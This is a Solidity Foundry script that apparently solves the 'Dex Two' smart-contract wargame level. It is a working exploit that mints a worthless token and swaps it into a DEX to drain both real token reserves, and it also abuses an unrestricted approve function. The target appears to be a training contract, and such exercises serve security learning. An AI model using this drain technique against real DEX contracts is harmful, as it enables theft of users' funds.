// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script, console} from "forge-std/Script.sol";

import {ERC20} from "@openzeppelin-06/token/ERC20/ERC20.sol";


import {Constants} from "./Constants.s.sol";

interface IDexTwo {
    function approve(address spender, uint256 amount) external;
    function swap(address from, address to, uint256 amount) external;

    function token1() external view returns(address);
    function token2() external view returns(address);
    function balanceOf(address token, address account) external view returns(uint256);
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol) public
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

interface ISwappableToken {
    function approve(address owner, address spender, uint256 amount) external;
    function transferFrom(address _from, address _to, uint256 amount) external;

    function balanceOf(address account) external view returns(uint256);
}

contract DexTwoAttackMaliciousContract is Constants {
    function attack(IDexTwo victim) public {
        address token1 = victim.token1();
        address token2 = victim.token2();

        // first let's fund our malicious contract
        ISwappableToken token1ERC20 = ISwappableToken(token1);
        ISwappableToken token2ERC20 = ISwappableToken(token2);
        SwappableToken token3ERC20 = new SwappableToken(address(victim), "worthlessToken", "LESS", 400);

        address token3 = address(token3ERC20);

        token1ERC20.approve(ATTACKER_ADDRESS, address(this), type(uint256).max);
        token2ERC20.approve(ATTACKER_ADDRESS, address(this), type(uint256).max);
        token3ERC20.approve(address(this), address(victim), type(uint256).max);

        token1ERC20.transferFrom(ATTACKER_ADDRESS, address(this), token1ERC20.balanceOf(ATTACKER_ADDRESS));
        token2ERC20.transferFrom(ATTACKER_ADDRESS, address(this), token2ERC20.balanceOf(ATTACKER_ADDRESS));
        token3ERC20.transfer(address(victim), 100);

        victim.swap(token3, token1, 100);
        victim.swap(token3, token2, 200);

        console.log("Victim token1 final balance: ", victim.balanceOf(token1, address(victim)));
        console.log("Victim token2 final balance: ", victim.balanceOf(token2, address(victim)));
        console.log("Victim token3 final balance: ", victim.balanceOf(token3, address(victim)));
    }
}

contract DexTwoAttacker is Constants, Script {

    function run() public {
        IDexTwo victim = IDexTwo(DEX_TWO_ADDRESS);

        vm.startBroadcast(ATTACKER_ADDRESS);
        attack(victim);
        vm.stopBroadcast();
    }

    function attack(IDexTwo victim) private {
        DexTwoAttackMaliciousContract _attacker = new DexTwoAttackMaliciousContract();
        _attacker.attack(victim);
    }
}
